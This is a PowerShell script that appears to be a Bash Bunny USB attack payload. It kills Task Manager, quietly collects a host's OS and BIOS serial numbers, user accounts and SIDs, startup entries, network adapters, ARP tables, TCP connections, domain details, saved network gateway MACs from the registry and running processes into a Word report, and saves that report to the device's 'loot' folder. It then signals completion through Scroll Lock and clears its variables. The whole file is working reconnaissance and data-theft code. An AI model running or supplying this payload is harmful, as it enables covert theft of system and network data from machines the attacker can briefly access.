Function New-WordTable {
    [cmdletbinding(
        DefaultParameterSetName='Table'
    )]
    Param (
        [parameter()]
        [object]$WordObject,
        [parameter()]
        [object]$Object,
        [parameter()]
        [int]$Columns,
        [parameter()]
        [int]$Rows,
        [parameter(ParameterSetName='Table')]
        [switch]$AsTable,
        [parameter(ParameterSetName='List')]
        [switch]$AsList,
        [parameter()]
        [string]$TableStyle,
        [parameter()]
        [Microsoft.Office.Interop.Word.WdDefaultTableBehavior]$TableBehavior = 'wdWord9TableBehavior',
        [parameter()]
        [Microsoft.Office.Interop.Word.WdAutoFitBehavior]$AutoFitBehavior = 'wdAutoFitContent'
    )
    #Specifying 0 index ensures we get accurate data from a single object
    $Properties = $Object[0].psobject.properties.name
    $Range = @($WordObject.Paragraphs)[-1].Range
    $Table = $WordObject.Tables.add(
    $WordObject.Range,$Rows,$Columns,$TableBehavior, $AutoFitBehavior)
 
    Switch ($PSCmdlet.ParameterSetName) {
        'Table' {
            If (-NOT $PSBoundParameters.ContainsKey('TableStyle')) {
                #$Table.Style = "Medium Shading 1 - Accent 1"
                $Table.Style = "Grid Table 4 - Accent 1"
            }
            $c = 1
            $r = 1
            #Build header
            $Properties | ForEach {
                Write-Verbose "Adding $($_)"
                $Table.cell(($r),($c)).range.Bold=1
                $Table.cell($r,$c).range.text = $_
                $c++
            }  
            $c = 1    
            #Add Data
            For ($i=0; $i -lt (($Object | Measure-Object).Count); $i++) {
                $Properties | ForEach {
                    $Table.cell(($i+2),$c).range.Bold=0
                    $Table.cell(($i+2),$c).range.text = [string]$Object[$i].$_
                    $c++
                }
                $c = 1 
            }                 
        }
        'List' {
            If (-NOT $PSBoundParameters.ContainsKey('TableStyle')) {
                $Table.Style = "Light Shading - Accent 1"
            }
            $c = 1
            $r = 1
            $Properties | ForEach {
                $Table.cell($r,$c).range.Bold=1
                $Table.cell($r,$c).range.text = $_
                $c++
                $Table.cell($r,$c).range.Bold=0
                $Table.cell($r,$c).range.text = $Object.$_
                $c--
                $r++
            }
        }
    }
}
Function val2addr($val){ 
    $addr="";
    foreach($i in $val){
	    $addr += "{0:x2} " -f $i 
    }
    $addr.Trim().Replace(' ', ':');
}
Stop-Process -Name "Taskmgr"
$Word = New-Object -ComObject Word.Application
#$Word.Visible = $True
$Document = $Word.Documents.Add()
$Selection = $Word.Selection
$Selection.Style = 'Title'
$Selection.TypeText("PC Info Report")
$Selection.TypeParagraph()
$Selection.Style = 'Heading 1'
$Selection.TypeText("Details")

$Selection.TypeParagraph()
$selection.TypeText("Hostname: $($env:COMPUTERNAME)")
$Selection.TypeParagraph()
$selection.TypeText("User: $($env:USERNAME)")
$selection.TypeParagraph()
$selection.TypeText("Date: $(Get-Date -Format "dddd dd MMMM yyyy hh:mm:ss")")
$selection.TypeParagraph()

#OS Info
$OS = @(Get-CimInstance -ClassName Win32_OperatingSystem | ForEach {
    [pscustomobject] @{
        Name = $_.Caption
        Version = $_.Version
        BuildNumber = $_.BuildNumber
        Architecture = $_.OSArchitecture
        SerialNumber = $_.SerialNumber
    }
})
$Selection.Style = 'Heading 2'
$Selection.TypeText("OS")
New-WordTable -WordObject $Selection -Object $OS -Columns 2 -Rows 5 -AsList
$Word.Selection.Start= $Document.Content.End

#BIOS Info
$BIOS = @(Get-WmiObject Win32_Bios | ForEach {
    [pscustomobject] @{
        Manufacturer = $_.Manufacturer
        Name = $_.Name
        Version = $_.Version
        SerialNumber = $_.SerialNumber
        BIOSVersion = $_.SMBIOSBIOSVersion
    }
})
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("BIOS")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $BIOS -Columns 2 -Rows ($BIOS.PSObject.Properties | Measure-Object).Count -AsList
$Word.Selection.Start= $Document.Content.End

#HDD Info
$DriveType = @{
    0x0 = 'Unknown'
    0x1 = 'No Root Directory'
    0x2 = 'Removable Disk'
    0x3 = 'Local Disk'
    0x4 = 'Network Drive'
    0x5 = 'Compact Disk'
    0x6 = 'RAM Disk'
}
$Volume = @(Get-WmiObject Win32_Volume | Sort-Object -Property Name | ForEach {
    [pscustomobject]@{
        Drive = $_.Name
        DriveType = $DriveType[[int]$_.DriveType]
        Label = $_.label
        FileSystem = $_.FileSystem
        'FreeSpace(GB)' = '{0:N2}' -f ($_.FreeSpace /1GB)
        'Capacity(GB)' = '{0:N2}' -f ($_.Capacity/1GB)
    }
})

$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("Drives") 
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $Volume -Columns 6 -Rows ($Volume.Count+1) –AsTable
$Word.Selection.Start= $Document.Content.End

$SU = (Get-CimInstance -ClassName Win32_StartupCommand | Select-Object -Property Name, User, Command, Location)
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("Start Up")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $SU -Columns 4 -Rows ($SU.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End

$UA =Get-WmiObject -Class Win32_UserAccount | Select-Object Caption, Domain, Name, FullName, SID
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("User Accounts")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $UA -Columns 5 -Rows ($UA.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End

$Selection.Style = 'Heading 1'
$Selection.TypeText("Networking")

$NAC = (Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "IPEnabled='True'" | Select-Object -Property Description, MACAddress, IPAddress, DefaultIPGateway)
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("Network Adapters")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $NAC -Columns 4 -Rows ($NAC.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End


$NW = (Get-NetNeighbor | Where-Object State -NE Unreachable | Select-Object -Property InterfaceAlias,IPAddress, LinkLayerAddress, State, Store)
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("Network")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $NW -Columns 5 -Rows ($NW.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End

# Arp Info
$ARP = (arp -a | ConvertFrom-String -PropertyNames ('Type', 'Internet', 'Address', 'Physical'))
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("ARP")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $ARP -Columns 4 -Rows ($ARP.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End


$process = Get-Process | Select-Object -Property Id, Name, Company, ProductVersion, Path

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Id -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.Name
    }
} | select-Object LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress

$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("Listeners / ActiveTcpConnections")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $listener -Columns 6 -Rows ($listener.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End

$ND = (Get-CimInstance -ClassName Win32_NTDomain | Select-Object -Property ClientSiteName, DcSiteName, Description, DnsForestName, DomainControllerAddress, DomainControllerName, DomainName, Roles, Status)
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("NT Domain")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $ND -Columns 2 -Rows ($ND.PSObject.Properties | Measure-Object).Count -AsList
$Word.Selection.Start= $Document.Content.End

$location = $PWD
cd 'hklm:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged'
$Mac = gci | % { $name=$_.GetValue('Description'); $mac=val2addr($_.GetValue('DefaultGatewayMac')); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;MAC_ADDRESS=$mac }}
cd $location
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("Reg Access Points")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $Mac -Columns 2 -Rows ($Mac.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End


$Selection.Style = 'Heading 1'
$Selection.TypeText("Software")
$Selection.TypeParagraph()

$Selection.Style = 'Heading 2'
$Selection.TypeText("Current running process")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $process -Columns 5 -Rows ($process.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End

<#$PE = Get-WmiObject -Namespace root\cimv2 -Class CIM_ProcessExecutable | %{try{[wmi]($_.Antecedent)}catch {$null}} | Select FileName,Extension,Manufacturer,Version -ErrorAction SilentlyContinue
$Selection.TypeParagraph()
$Selection.Style = 'Heading 2'
$Selection.TypeText("CIM Process Executables")
$Selection.TypeParagraph()
New-WordTable -WordObject $Selection -Object $PE -Columns 4 -Rows ($PE.Count+1) -AsTable
$Word.Selection.Start= $Document.Content.End#>


$Selection.Style = 'Heading 1'
$Selection.TypeText("Environment Variables")
$Selection.TypeParagraph()
$envPath = $env:Path -split ";" | %{"{0}`n" -f $_}
$Selection.Style = 'Normal'
$Selection.TypeText("Path:")
$Selection.TypeParagraph()
$Selection.TypeText($envPath)
$Selection.TypeParagraph()

$Report = ((gwmi win32_volume -f 'label=''BashBunny''').Name + "loot\Report_$env:COMPUTERNAME.docx");
$Document.SaveAs([ref]$Report,[ref]$SaveFormat::wdFormatDocument)
$Word.Quit()
$null = [System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$Word)

$o = New-Object -com wscript.shell;
$o.SendKeys('{SCROLLLOCK}');
sleep 1;
$o.SendKeys('{SCROLLLOCK}');
sleep 1;
$o.SendKeys('{SCROLLLOCK}');
sleep 1;
$o.SendKeys('{SCROLLLOCK}');

$null = [System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$o)
[gc]::Collect()
[gc]::WaitForPendingFinalizers()

Remove-Variable -Name Word, OS, BIOS, DriveType, Volume, SU, 
UA,NAC,NW,ARP, process, listener,listenerItem, processItem, 
ND, envPath, PE, Mac, location, o -ErrorAction SilentlyContinue -Force